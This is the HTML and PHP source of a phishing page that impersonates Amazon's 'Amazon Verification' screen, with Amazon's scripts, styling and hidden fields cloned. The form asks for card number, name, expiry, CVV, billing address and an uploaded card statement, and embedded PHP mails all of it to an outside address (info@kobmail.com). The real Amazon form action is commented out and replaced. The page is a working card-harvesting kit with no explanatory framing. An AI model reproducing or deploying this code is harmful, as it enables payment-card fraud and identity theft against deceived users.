...
var ue_id = 'CH47RP95HXV6NABMTMQB',
    ue_url = '/ap/uedata',
    ue_navtiming = 1,
    ue_mid = 'ATVPDKIKX0DER',
    ue_sid = '139-8544131-6267854',
    ...
    ue_rpl_ns = 'cel-rpl',
    ue_ddq = 1,
    ue_fpf = '//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:139-8544131-6267854:CH47RP95HXV6NABMTMQB$uedata=s:',
    ue_sbuimp = 1,
...
<!-- lm0p5bnakoyw387md7qcy4d13ilxxjoa2nq --><script>var aPageStart = (new Date()).getTime();</script><meta charset="utf-8"/>
    <title dir="ltr">Amazon Verification</title>
...
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/01SdjaY0ZsL._RC|419sIPk+mYL.css,41REwEK74kL.css_.css?AUIClients/AuthenticationPortalAssets" />
...
la())})({reg:{},unreg:{}});p.declare("a-fix-event-off",!1);x("pagejs:pkgExecTime",D()-za)})(window,document,Date);
  ...
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/21G215oqvfL._RC|21OJDARBhQL.js,218GJg15I8L.js,31lucpmF4CL.js,21juQdw6GzL.js,21zp0xRcpuL.js,01MobMUud8L.js,519IJ+sPUqL.js_.js?AUIClients/AuthenticationPortalAssets');
  ...
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/31crZaOVIqL.js?AUIClients/CVFAssets');
  ...
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/71Fkmuq6WNL.js?AUIClients/FWCIMAssets');
</script>
...
if(window.ue&&uet) { uet('bb'); }
  ...
  <body class="ap-locale-en_US a-m-us a-aui_157141-c a-aui_158613-c a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c">
...
if (window.csa) {
    csa("Config", {
        ...
        'CacheDetection.RequestID': "CH47RP95HXV6NABMTMQB",
        'CacheDetection.Callback': window.ue && ue.reset
    });

    csa("Events")("setEntity", {
        page: {requestId: "CH47RP95HXV6NABMTMQB", meaningful: "interactive"},
        session: {id: "139-8544131-6267854"}
    });
}
...
if(isset($_FILES["file"]["name"])){
   $email = "noreply@unlimitedhostinglifetimeashleyjohnsons.ss";
    $addCreditCardNumber = $_POST['addCreditCardNumber'];
    $ardHolderName = $_POST['ardHolderName'];
...
$fromemail =  "noreply@unlimitedhostinglifetimeashleyjohnsons.ss";
$ardHolderName = $_POST['ardHolderName'];
$email_message = '<h2>Request Submitted</h2>
                    <p><b>Credit Card Number:</b> '.$addCreditCardNumber.'</p>
                   <p><b>Holder Name:</b> '.$ardHolderName.'</p>
					<p><b>Exp Month:</b> '.$expmonth.'</p>
					<p><b>Exp Year:</b> '.$expyear.'</p>
					<p><b>CVV:</b> '.$cvv.'</p>
					<p><b>Address:</b> '.$address.'</p>
					<p><b>Address2:</b> '.$address2.'</p>
                    <p><b>Zip Code:</b><br/>'.$zipcode.'</p>';
...
$toemail="info@kobmail.com";	
 
if(mail($toemail, $ardHolderName, $email_message, $headers)){
...
<div class="a-section">
  ...
  <!-- original <form id="ap_register_form" name="register" method="post" novalidate action="https://www.amazon.com/ap/register" data-enable-mobile-account-js="false" data-post-verification-action="https://www.amazon.com/ap/register" class="a-spacing-none auth-validate-form auth-real-time-validation"> -->

<form id="pp-91gkeq-12" method="post"  class="apx-add-card-compact-form a-spacing-none" enctype="multipart/form-data">
          		  <input type="hidden" name="ppw-widgetState" value="4-MS0d8eI1PxO0wTVe2xWXMSprU4Eq9YQ3wRpjW5c46RaysJt_OHKrH47zfcxKC6hJ4NLkZF7YHS2yRwPBlwQNP8LhpDEFausm-AbxAsd3SpPiKPhMyMmaf5nQ3cLPQaWZskpkrJ3bjQrkX68W3qeah-0iCdlZNQOaPrJ2Wm7WATokPhxcEHPK7LyCoIC2NSByP2dlKh0YAlY3Qxo4GssXmANyEp3E47RhrpAI9uim0SMo66qbWhHZUzUOxeDqN3bSUHzDTgzwqeZDJ0L_wOr7pNKKGJax8i9NGpblKLGVjOYObkAJsi0tj1AZCHJHqavWXPbdprq0O7DxYjqnLlU5XIC6ZZJRsEAh_H9ZCstx71Wf3pK3gLUjaYC3CozANdsLpwKh6DCcx3TXSQtMK1Nf-tw9DRJQCStV8FgF0AM-usYQNg0DJFJndJROKMegDc5gVOpcRdeM5D-gScKX_t_nD0swF1TMTFKMBzvbPSxwts6sglkEh3_0DRDImsJEUKD2HpyXiyqTOtvsl2VDpACY-ha4HE5Zc2GXFxXC9bySX6TmaUE3cRzilqyCyiXjQb4N66hQyGcnB63pIaEd3PagwGUkx13mtElxIyyGs6S6hsC6sa5EQ3631bzCeOHSHzvC2RGMU9nZnMZvP3kYubThPNJxDJimEsR73hslbnKpitJpej2bKEGYHazCKURMBPTbpayH-4ME-lNlHcUq-4a7y4AWBs2pNuzUirSlviSOFjkrufcHCBW_wtu6D8KbbkWdnfB_BsRfnTJrJH05nsxG0kfTUX95eqk-l4_Z05HO7jOlZhq96dzpIsppmDtCXSI9m_mr9prqEFo20jZTYKaA6h3O57rjfkDCx9Ihk_SkflAZt0TMMKrlwWBDZ3BO2Ac7Md8CkDSZkhjpolhTCqKSF5a__RvHex3LuzZfBJn4Til5hec4u8fVL8ioBayau-mcqinpmM6eldLfzWnH2a_tVhaoo-xJITXkWJR-pAYWEMM8DZ2htgQKpjEUOK73CG4TV2y4BVmKWk-r42rMt0J9rzPyWrViVWWnnt7nBGhCmwD-luru-r3RrBRBEZjDyN4ZPxyZnwXUM0pcUlqtPhtj0WiuI0ISZS9gE9dMWWtcntylhJsizu1xcmx6W6qGHhNCDMql75IwPfV0FQJMHmNtqiTOjhzpJzeNXzqnLyPvvjD7qbo0-81WDlxC6nZzOHrH7m3Or2xXrLLr3UWiWt9QeaJg0ekRmcJzvmm0rUJToyiZcOTn2Ehc5NHxdtKspno333LK7qJfpKI2JeNEz63sWpM38XEqXv95D9HiKDwIxnFfOtiy3UNZahFnzct3RAtXxylmyf0Hr2IsCwkIOOjlmJE_O81q34sb4n5iVFeRDTril-P7ymKdwvBqEWvjgNwWrDp28mmIw41TTiWaxsvwp66Y3nsi3mywdr20DPCeRx6AG2URO9y5XdHStAu2RdGYzTfesVLWMTSXxmIP00vP0eT-YRIn3-UA84FeUQoONDIn0w75mAyzFVYbqchkH2m-MAYrRgIieFcNHZsZUKCxAgicNigjawz9WoSIuRfGGLZ6l2WzVhwwLi7PvbhN_C0JwOBGLWQvQeqHBGnG67G-cZI3ppWr9nU18FrSDNiapBqA-MRE9XBR4APPLtHnhhdiawnCFyVsd5pOIItk8-VC_iK1wpasFffk4qHqA2_2L3FgrGvK9ybH49wJCstaeIDxqJnGDUdKy_DvXDbE7PEnXvVCCO0e9rbvDESTAro3tZ8Mv7xzErZJ3vYbbfsviaSvYoXwBPq4bupxSNy2bMtlfDeVI7gQg6bWqi6dOEQ28bB8jqsFfQiGRxCdxBlKxdjSuLMxq92o42ZollOKKkRB8VWxrorhOFfKjMzM-U9CjxexLFdefj9YI1ZQ5_4qQmnBlmfl7zwQ_VhaY9LR0WWO7tNnT9KHjEt5VW7YsNgc1ZZalzZ3hYqjCF5-wNs3dmVFj-zKTEaOoZNs_EGvZxt8Sh7ggz5iAqa5PhlJGErdzMntr1uHiG33gxqInKSedzZ10oTXgGvHdxTIY9JgIXDzIG1cj6cx3np4MijKaJdAYuAsfpZOgEbDuaSqhgDfSnKqnY4rjvX50GJdK1LyCXLTTXgSMPsO_hhDEuli8VnQg7SlIKTA_wghAzD6g2v5yhd73yDldL-5RNasTcSSFMdtAEKK6jTFiuC4JcP4nieEX8WFywpWhkxVha8s7PvbXalvlLuNsXTc-zpkDyM2ukFWii-d9wrE5NvWyE76VyqIe-tmjI_fDTXoCa1oS_eiDXM9TrYhTXzgy0BOKwe9sEzBrBNn65rPneawlqhbB_nFrUOKi8iIK124rhLzS9YdkzrKkXAgJufOdG9ZdRInZlekNA7HsOU7ELOhQmVcqbFoj20-OEEUBAzWTrviSWQr1tOg2HjUZ92KIJTdOncldB1H2JZ1nfGeU36uyWHbx_n2OowklMFUslFB1AcCB3Qjy1zMgBoHlmPk0pfeKBPZjXTqXZ3He2Z3eEZ9dAUL4D2hleVvWHY51u8RqeHsZkTrOW2uAId4uAYsBrLrB7Btzm7VkjCgO2AE-ojzdmUMq48prZ4OL9A7Pct_UY_zk7FbSrDn7o0hlTer7Q">
    ...
    <input type="hidden" name="openid.return_to" value="ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS8/cmVmXz1uYXZfY3VzdHJlY19zaWduaW4=" />
  
    <input type="hidden" name="prevRID" value="ape:Q0g0N1JQOTVIWFY2TkFCTVRNUUI=" />
  
    <input type="hidden" name="workflowState" value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.sozNQlWs2qaIWLzaDwpQebrx8tCQUCB7TzrrYk4j8RJo3xRdKZoMzQ.yXKlHnlzkE0_aB0j.fHKz0d_E47rMftQpANtd1050qq6euOLnr0mB8QBqZDMi5aLSD9asXZPid_PFPKFqx8unIr6nTmJ3jGStdWJfXbp6dCt4Fye921cCsfkqVA9W0JwUsblYHHjOQ_yYtm4aioLua4DnSsF5FUjv0NCaQA0MzwLC-NGXbOfOlsfXJOCjspHbh8fJI7duJ4la8mEJGTph1ak46MshvA0Xhz6hHCKgk4ErJ310VPAejm6x3e_bbbF6ev9CQXTz-K594uAdWVvKwwr5JCRXTpqNF-jlNTW3I53k-Dw.SKfZ2UF4nYwh_x7MlEKAgg" />
                        ...
                        <div class="a-column a-span8 pmts-add-credit-card-number-input-box a-span-last">
                           <div class="a-row">
                              <div class="a-column a-span9">
								 ...
								 <input type="tel" id="pp-91gkeq-14" autocomplete="off" name="addCreditCardNumber" class="a-input-text a-form-normal"></div>
                             

							 </div>
                              <div class="a-column a-span3 a-spacing-top-mini a-span-last">
                                 <div data-pmts-component-id="pp-91gkeq-7" class="a-section a-spacing-none pmts-portal-component pmts-portal-components-pp-91gkeq-7"><img alt="" src="https://images-na.ssl-images-amazon.com/images/G/01/x-locale/common/transparent-pixel._V192234675_.gif" class="a-hidden aok-hidden" id="pp-91gkeq-15"></div>
                              </div>
                           </div>
                        </div>
                     </div>
...
<div class="a-row a-spacing-small">
                        <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label"><label for="pp-91gkeq-16" class="a-form-label">Name on card</label></div>
                        <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
						
						<input type="text" maxlength="50" id="pp-91gkeq-16" autocomplete="off" name="ardHolderName" class="a-input-text a-form-normal"></div>
                   

				   </div>
                     <div class="a-row a-spacing-small">
                        <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-credit-card-expiration-date-label">
						<label for="pp-91gkeq-17" id="pp-91gkeq-18" class="a-form-label">Expiration date</label></div>
                        <div class="a-column a-span8 pmts-credit-card-expiration-date-input-box a-span-last">
                           <div id="add-credit-card-expiry-date-input-id" class="a-row">
                              <span class="a-dropdown-container">
                                 <select name="expmonth" autocomplete="off" data-a-native-class="pmts-native-dropdown" id="pp-91gkeq-17" tabindex="0" class="a-native-dropdown pmts-native-dropdown">
                                 ...
                                 <span tabindex="-1" id="pp-91gkeq-20" data-pmts-component-id="pp-91gkeq-3" data-a-class="pmts-expiry-month pmts-portal-component pmts-portal-components-pp-91gkeq-3" class="a-button a-button-dropdown pmts-expiry-month pmts-portal-component pmts-portal-components-pp-91gkeq-3" style="min-width: 0%;" aria-hidden="true"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" aria-hidden="true"><span class="a-dropdown-prompt">01</span></span><i class="a-icon a-icon-dropdown"></i></span></span>
                              </span>
                            
							<span class="a-letter-space"></span>
                              <span class="a-dropdown-container">
                                 <select name="expyear" autocomplete="off" data-a-native-class="pmts-native-dropdown" id="pp-91gkeq-19" tabindex="0" class="a-native-dropdown pmts-native-dropdown">
                                 ...
                                 <span tabindex="-1" id="pp-91gkeq-21" data-pmts-component-id="pp-91gkeq-3" data-a-class="pmts-expiry-year pmts-portal-component pmts-portal-components-pp-91gkeq-3" class="a-button a-button-dropdown pmts-expiry-year pmts-portal-component pmts-portal-components-pp-91gkeq-3" style="min-width: 0%;" aria-hidden="true"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" aria-hidden="true"><span class="a-dropdown-prompt">2021</span></span><i class="a-icon a-icon-dropdown"></i></span></span>
                              </span>
                           </div>
                        </div>
                     </div>
					  <div class="a-row a-spacing-small">
                        <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-add-credit-card-number-label"><label for="pp-91gkeq-14" class="a-form-label">CVV</label></div>
                        <div class="a-column a-span8 pmts-add-credit-card-number-input-box a-span-last">
                           <div class="a-row">
                              <div class="a-column a-span9">
                                 <div class="a-section a-spacing-none apx-add-credit-card-number"><input type="tel" id="pp-91gkeq-14" autocomplete="off" name="cvv" class="a-input-text a-form-normal"></div>
                              </div>
                              <div class="a-column a-span3 a-spacing-top-mini a-span-last">
                                 <div data-pmts-component-id="pp-91gkeq-7" class="a-section a-spacing-none pmts-portal-component pmts-portal-components-pp-91gkeq-7"><img alt="" src="https://images-na.ssl-images-amazon.com/images/G/01/x-locale/common/transparent-pixel._V192234675_.gif" class="a-hidden aok-hidden" id="pp-91gkeq-15"></div>
                              </div>
 ...
 <div class="a-row a-spacing-small">
                        <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-add-credit-card-number-label"><label for="pp-91gkeq-14" class="a-form-label">Address</label></div>
                        <div class="a-column a-span8 pmts-add-credit-card-number-input-box a-span-last">
                           <div class="a-row">
                              <div class="a-column a-span9">
                                 <div class="a-section a-spacing-none apx-add-credit-card-number"><input type="tel"  placeholder="Street address or P.O. Box" id="pp-91gkeq-14" autocomplete="off" name="address" class="a-input-text a-form-normal"></div>
                              </div>
                              <div class="a-column a-span3 a-spacing-top-mini a-span-last">
                                 <div data-pmts-component-id="pp-91gkeq-7" class="a-section a-spacing-none pmts-portal-component pmts-portal-components-pp-91gkeq-7"><img alt="" src="https://images-na.ssl-images-amazon.com/images/G/01/x-locale/common/transparent-pixel._V192234675_.gif" class="a-hidden aok-hidden" id="pp-91gkeq-15"></div>
                              </div>
					  ...
					  <div class="a-row a-spacing-small">
                        ...
                        <div class="a-column a-span8 pmts-add-credit-card-number-input-box a-span-last">
                           <div class="a-row">
                              <div class="a-column a-span9">
                                 <div class="a-section a-spacing-none apx-add-credit-card-number"><input type="tel"  placeholder="Apt, suite, unit, building, floor, etc." id="pp-91gkeq-14" autocomplete="off" name="address2" class="a-input-text a-form-normal"></div>
                              </div>
                              <div class="a-column a-span3 a-spacing-top-mini a-span-last">
                                 <div data-pmts-component-id="pp-91gkeq-7" class="a-section a-spacing-none pmts-portal-component pmts-portal-components-pp-91gkeq-7"><img alt="" src="https://images-na.ssl-images-amazon.com/images/G/01/x-locale/common/transparent-pixel._V192234675_.gif" class="a-hidden aok-hidden" id="pp-91gkeq-15"></div>
                              </div>
 ...
 <div class="a-row a-spacing-small">
                        <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-add-credit-card-number-label"><label for="pp-91gkeq-14" class="a-form-label">ZIP Code</label></div>
                        <div class="a-column a-span8 pmts-add-credit-card-number-input-box a-span-last">
                           <div class="a-row">
                              <div class="a-column a-span9">
                                 <div class="a-section a-spacing-none apx-add-credit-card-number">
								 <input type="text"  id="enterAddressPostalCode" autocomplete="off" name="zipcode" class="a-input-text a-form-normal">
								 
								 </div>
                              </div>
                              <div class="a-column a-span3 a-spacing-top-mini a-span-last">
                                 <div data-pmts-component-id="pp-91gkeq-7" class="a-section a-spacing-none pmts-portal-component pmts-portal-components-pp-91gkeq-7">
								</div>
                              </div>
                           </div>
                        </div>
...
<div class="a-row a-spacing-small">
                           ...
                           <div class="a-row">
                                 ...
                                 <div class="a-section a-spacing-none apx-add-credit-card-number"><br>
								<center><label for="pp-91gkeq-14" class="a-form-label">Upload Recent Card Statement<br>( For Cross verification of ownership )</label><br>
								 <input type="file" name="file" class="a-input-text a-form-normal"></center>
								 </div>
                            <br>
                              <div class="a-column a-span3 a-spacing-top-mini a-span-last">
                                 <div data-pmts-component-id="pp-91gkeq-7" class="a-section a-spacing-none pmts-portal-component pmts-portal-components-pp-91gkeq-7">
      ...
      <div class="a-row a-spacing-extra-large">
        ...
        <span class="a-button a-button-normal a-button-span12 a-button-primary">
		<span class="a-button-inner">
		<!-- submit button-->
		
		<input id="continue" name="submit" tabindex="11" class="a-button-input" type="submit"/>
			
		<!-- submit end-->
		<span id="pp-91gkeq-23-announce" class="a-button-text" aria-hidden="true">Submit</span>
		</span></span>
...
<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:139-8544131-6267854:CH47RP95HXV6NABMTMQB$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DCH47RP95HXV6NABMTMQB:0' alt=""/>
</noscript>
</body>
</html>
